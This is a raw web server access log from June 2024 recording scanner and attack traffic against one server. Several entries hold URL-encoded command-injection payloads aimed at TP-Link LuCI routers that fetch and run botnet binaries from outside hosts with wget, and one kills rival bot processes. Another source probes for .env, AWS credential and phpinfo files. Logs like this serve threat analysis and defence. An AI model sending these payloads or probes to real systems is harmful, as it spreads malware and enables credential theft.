92.249.48.222 - - [21/Jun/2024:01:19:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [21/Jun/2024:01:33:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [21/Jun/2024:01:33:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:01:37:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:01:54:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.235.24.199 - - [21/Jun/2024:01:56:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.12.240.40 - - [21/Jun/2024:02:10:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.222 - - [21/Jun/2024:02:14:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [21/Jun/2024:02:28:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
78.153.140.177 - - [21/Jun/2024:02:31:19 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:32 +0000] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xB7\xEB#\x5CF\x01\xD1\xE1R\xC3\x8B\x0C\x82\xAB\xD3\xDC\xF2\xBB0\x9F\x99\xE9\xF9\xE8_\x1F\xCFQc\x02\xD5\xE2 w\xCBc\x99\x94G\xD3\xAB\xE3}>~xZ\x22O\xF6\x8A8\x8C+\x83\xAA\x16J\xFAX5\x04p\xE5x\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0" 400 154 "-" "-"
78.153.140.177 - - [21/Jun/2024:02:31:32 +0000] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:33 +0000] "GET /.aws/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:35 +0000] "GET /aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:36 +0000] "GET /test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:37 +0000] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:38 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:39 +0000] "GET /phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [21/Jun/2024:02:31:40 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.249.48.222 - - [21/Jun/2024:02:35:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.43.161.135 - - [21/Jun/2024:02:36:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
174.128.182.169 - - [21/Jun/2024:02:43:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
174.128.182.169 - - [21/Jun/2024:02:43:45 +0000] "" 400 0 "-" "-"
185.191.127.212 - - [21/Jun/2024:02:52:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
